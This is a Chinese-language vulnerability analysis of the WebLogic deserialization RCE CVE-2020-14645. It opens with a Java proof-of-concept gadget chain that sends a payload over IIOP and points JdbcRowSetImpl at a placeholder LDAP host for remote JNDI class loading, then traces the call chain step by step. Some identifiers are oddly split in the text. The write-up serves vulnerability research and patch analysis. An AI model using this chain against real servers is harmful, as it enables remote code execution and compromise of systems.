# Weblogic 远程命令执行漏洞（CVE-2020-14645）分析



> 作者：白帽汇安全研究院@hu4wufu
>
> 核对：白帽汇安全研究院@r4v3zn



## 0x00 前言

近期公布的关于 Weblogic 的反序列化RCE漏洞 CVE-2020-14645，是对 CVE-2020-2883的补丁进行绕过。之前的 CVE-2020-2883 本质上是通过 `ReflectionExtractor` 调用任意方法，从而实现调用 `Runtime` 对象的 exec 方法执行任意命令，补丁将 `ReflectionExtractor` 列入黑名单，那么可以使用 `UniversalExtractor` 重新构造一条利用链。`UniversalExtractor` 任意调用 `get`、`is`方法导致可利用 JDNI 远程动态类加载。`UniversalExtractor` 是 Weblogic 12.2.1.4.0 版本中独有的，本文也是基于该版本进行分析。

## 0x01 漏洞复现

漏洞利用 POC，以下的分析也是基于该 POC 进行分析

```java
ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{new ReflectionExtractor("toString",new ob ject[]{})});
PriorityQueue<object> queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
queue.add("1");
queue.add("1");
//构造 UniversalExtract 调用 JdbcRowSetImpl 对象的任意方法
UniversalExtractor universalExtractor = new UniversalExtractor();
object object = new object[]{};
Reflections.setFieldValue(universalExtractor,"m_aoParam",object);
Reflections.setFieldValue(universalExtractor,"m_sName","Databa seme taData");
Reflections.setFieldValue(universalExtractor,"m_fMethod",false);
ValueExtractor[] valueExtractor_list = new ValueExtractor[]{universalExtractor};
Field[] fields = ChainedExtractor.class.getDeclaredFields();
Field field = ChainedExtractor.class.getSuperclass().getDeclaredField("m_aExtractor");
field.setAccessible(true);
field.set(chainedExtractor,valueExtractor_list);
JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(JdbcRowSetImpl.class);
jdbcRowSet.setDataSourceName("ldap://ip:port/uaa");
object[] queueArray = (object[])((object[]) Reflections.getFieldValue(queue, "queue"));
queueArray[0] = jdbcRowSet;
// 发送 IIOP 协议数据包
Context context = getContext("iiop://ip:port");
context.rebind("hello", queue);
```

成功弹出计算机

![image-20200804101553091.png](https://nosec.org/avatar/uploads/attach/image/4774e279d3f810256b762eb4622d2bea/image-20200804101553091.png)

## 0x02 漏洞分析

了解过 `JDNI` 注入的都知道漏洞在 `lookup()` 触发，这里在 `JdbcRowSetImpl.class` 中 `326` 行 `lookup()` 函数处设置断点。

以下为漏洞利用的简要调用链：

我们从头分析，我们都知道反序列化的根本是对象反序列化的时候，我们从 IO 流里面读出数据的时候再以这种规则把对象还原回来。我们在 `in.readob ject()` 处打断点，跟进查看 `PriorityQueue.readob ject()`方法

![image-20200804103549551.png](https://nosec.org/avatar/uploads/attach/image/e7979032e713efccb4e2081ab3393705/image-20200804103549551.png)

这里 782 执行 `s.defaultReadob ject()` ，785 执行 `s.readInt()` 赋给对象输入流大小以及数组长度，并在 790 行执行 for 循环，依次将 `s.readob ject()` 方法赋值给 `queue` 对象数组，这里 `queue` 对象数组长度为 2。

![image-20200804104305927.png](https://nosec.org/avatar/uploads/attach/image/b7c3f090786f93a83cf52066a09c3eee/image-20200804104305927.png)

接着往下跟，查看 `heapify()` 方法。`PriorityQueue` 实际上是一个最小堆，这里通过 `siftDown()` 方法进行排序实现堆化，

![image-20200804105255018.png](https://nosec.org/avatar/uploads/attach/image/a32918a13289041ec44d7d9076adf24c/image-20200804105255018.png)

跟进 `siftDown()` 方法，这里首先判断 `comparator` 是否为空

我们可以看看 `comparator` 是怎么来的，由此可见是在 `PriorityQueue` 的构造函数中被赋值的，在初始化构造时，除了给 `this.comparator` 进行赋值之外，通过 `initialCapacity` 进行初始化长度。

![image-20200804194458747.png](https://nosec.org/avatar/uploads/attach/image/9bafecfe467d0b438a07ee6303c72049/image-20200804194458747.png)

`comparator` 不为空，所以我们执行的是 `siftDownUsingComparator()` 方法，所以跟进 `siftDownUsingComparator()` 方法。

![image-20200804112050425.png](https://nosec.org/avatar/uploads/attach/image/76bbc1f12c4d9ed1c3fe71b0fb7e66bc/image-20200804112050425.png)

继续跟进 `ExtractorComparator.compare()` 方法

![image-20200804112730337.png](https://nosec.org/avatar/uploads/attach/image/1f864d9da733499dc20edc62b170347e/image-20200804112730337.png)

这里调用的是 `this.m_extractor.extract()` 方法，来看看 `this.m_extractor`，这里传入了 `extractor`，

![image-20200804200522899.png](https://nosec.org/avatar/uploads/attach/image/4a7a6779c7153ca20c89804f15263ad5/image-20200804200522899.png)

`this.m_extractor` 的值是与传入的 `extractor` 有关的。这里需要构造 `this.m_extractor` 为 `ChainedExtractor`，才可以调用 `ChainedExtractor` 的 `extract()` 方法实现 `extract()` 调用。

继续跟进 `ChainedExtractor.extract()` 方法，可以发现会遍历 `aExtractor` 数组，并调用 `extract()`方法。

![image-20200804121015290.png](https://nosec.org/avatar/uploads/attach/image/7c79e1be0ee4f3ad2f52286303df9133/image-20200804121015290.png)

跟进 `extract()` 方法，此处由于 `m_cacheTarget` 使用了 `transient` 修饰，无法被反序列化，因此只能执行 `else` 部分，最后通过 `this.extractComplex(oTarget)` 进行最终触发漏洞点

![image-20200804152930452.png](https://nosec.org/avatar/uploads/attach/image/3241805391f43dc50eb0e0b5fb2403e2/image-20200804152930452.png)

`this.extractComplex(oTarget)` 中可以看到最后通过 `method.invoke()` 进行反射执行，其中 `oTarget`和 `aoParam` 都是可控的。

![image-20200805104643434.png](https://nosec.org/avatar/uploads/attach/image/3ca14bab8a17510b1e32e4e93b8da57d/image-20200805104643434.png)

我们跟进190的 `findMethod()` 方法，在 475 行需要使 `fExactMatch` 为 `true`，`fStatic` 为 `false`才可让传入 `clz` 的可以获取任意方法。`fStatic` 是可控的，而 `fExactMatch` 默认为`true` ，只要没进入 `for` 循环即可保持 `true` 不变，使 `cParams` 为空即 `aclzParam` 为空的 `Class` 数组即可，此处 `aclzParam` 从 `getClassArray()` 方法获取。

![image-20200805105432824.png](https://nosec.org/avatar/uploads/attach/image/542de6fe97ae010969077e4d5a0ecb69/image-20200805105432824.png)

在 `getClasssArray` 中通过获取输入参数的值对应的 Class 进行处理。

![image-20200805110432248.png](https://nosec.org/avatar/uploads/attach/image/622b7bbc242dad427b917eddb16477a2/image-20200805110432248.png)

由于传入的 `aoParam` 是一个空的 `ob ject[]`，所以获取对应的 `Class` 也为空的 `Class[]`，跟入 `isPropertyExtractor()` 中进行进行获取可以看到将 `this._fMethod` 获取相反的值。

![image-20200805111826338.png](https://nosec.org/avatar/uploads/attach/image/347927a9064d40cd2f0bea6a1140fe5d/image-20200805111826338.png)

由于 `m_fMethod` 被 `transient` 修饰，不会被序列化，通过分析 `m_fMethod` 赋值过程，可发现在 `init()` 时会获取sCName，并且通过判定是否为 `()` 结尾来进行赋值。

![image-20200805114008976.png](https://nosec.org/avatar/uploads/attach/image/d85fa77dd970a28869b5b88cfd643877/image-20200805114008976.png)

![image-20200805112641391.png](https://nosec.org/avatar/uploads/attach/image/f629c5395d5686fa5336041b8688f9c7/image-20200805112641391.png)

由于参数为 `this` 的原因，导致`getValueExtractorCanonicalName()`方法返回的都是 `null`。

![image-20200805112805383.png](https://nosec.org/avatar/uploads/attach/image/2b13cead2d716e4b58602352f5c4d26c/image-20200805112805383.png)

跟入 `getValueExtractorCanonicalName()`函数，最后是通过调用 `computeValuExtractorCanonicalName`进行处理。

![image-20200805113204395.png](https://nosec.org/avatar/uploads/attach/image/a1711aabcfd46f22fba644eff8200ecf/image-20200805113204395.png)

跟入 `computeValuExtractorCanonicalName()` 之后，如果 `aoParam`不为 `null` 且数组长度大于 0 就会返回 `null`，由于 `aoParam` 必须为 `null` ，因此我们调用的方法必须是无参的。接着如果方法名 `sName`不以 `()` 结尾，就会直接返回方法名。否则会判断方法名是否以 `VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES` 数组中的前缀开头，如果是的话就会截取掉并返回。

![image-20200805145607115.png](https://nosec.org/avatar/uploads/attach/image/afa0cd1e0ad8cdedee0ecf6c183e9cac/image-20200805145607115.png)

回到 `extractComplex()` 方法中，在 `if` 条件里会对上述返回的方法名做首字母大写处理，然后拼接 `BEAN_ACCESSOR_PREFIXES` 数组中的前缀，判断 `clzTarget` 类中是否含有拼接后的方法。这里可以看到我们只能调用任意类中的 `get` 和 `is` 开头的无参方法。也就解释了为什么 `poc` 会想到利用 `JNDI` 来进行远程动态类加载。

![image-20200805144604232.png](https://nosec.org/avatar/uploads/attach/image/b37fd39e5eee55eca1edbc98f85f47c6/image-20200805144604232.png)

跟进 `method.invoke()` 方法，会直接跳转至 `JdbcRowSetImpl.getDataba seme taData()`。

![image-20200805144744730.png](https://nosec.org/avatar/uploads/attach/image/deaaaca38389e10f3a8875594e8a2ef7/image-20200805144744730.png)![image-20200805150250708.png](https://nosec.org/avatar/uploads/attach/image/fefbeab9bb4e2734eccfa675ac235792/image-20200805150250708.png)

由于`JdbcRowSetImpl.getDataba seme taData()`，调用了 `this.connect()`，可以看到在 326 行执行了 `lookup` 操作，触发了漏洞。

![image-20200804154222491.png](https://nosec.org/avatar/uploads/attach/image/f89f644faa08ba47d5d4195a0991999f/image-20200804154222491.png)

![image-20200804154640662.png](https://nosec.org/avatar/uploads/attach/image/b4ea97dfb23997a8313ceb9f0bfe6ab5/image-20200804154640662.png)

至此，跟进 `getDataSourceName()`，可看到调用了可控制的 `dataSource`。

![image-20200805220712478.png](https://nosec.org/avatar/uploads/attach/image/6bf126cbda43b9dbebcddcd4bb097e26/image-20200805220712478.png)

## 0x03 总结

此漏洞主要以绕过黑名单的形式，利用 `UniversalExtractor` 任意调用`get`、`is`方法导致 JNDI 注入，由此拓展 CVE-2020-14625。

## 0x04 参考

- [WebLogic coherence UniversalExtractor 反序列化 (CVE-2020-14645) 漏洞分析](https://paper.seebug.org/1280/#cve-2020-14645)
- https://www.oracle.com/security-alerts/cpujul2020.html
